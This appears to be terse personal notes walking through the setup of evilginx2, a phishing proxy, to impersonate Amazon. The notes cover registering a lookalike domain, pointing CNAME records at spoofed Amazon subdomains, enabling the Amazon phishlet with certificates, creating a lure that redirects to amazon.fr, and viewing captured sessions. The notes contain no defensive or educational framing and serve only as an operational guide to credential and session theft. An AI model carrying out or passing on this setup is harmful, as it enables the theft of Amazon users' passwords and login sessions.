evilginx2
apache stop
open ports 443 80
(github evilginx2 installation need : go export gopath : command make)
./bin/evilginx -p ./phishlets/
domain name ex : azuremines.xyz
config ip : domain ip : ex : 11.22.33.44
config domain : azuremines.xyz
phishlets hostname amazon azuremines.xyz
phishlest get-hosts amazon : www.azuremines.xyz, fls-na.azuremines.xyz, images-na.azuremines.xyz
add this subdomains with CNAME reccord
phishlets enable amazon to generate certfiles .crt and .key
(also can with certbot)
lures create amazon
lures edit 0 path /
lures edit 0 redirect_url https://www.amazon.fr/
lures get-url 0
sessions
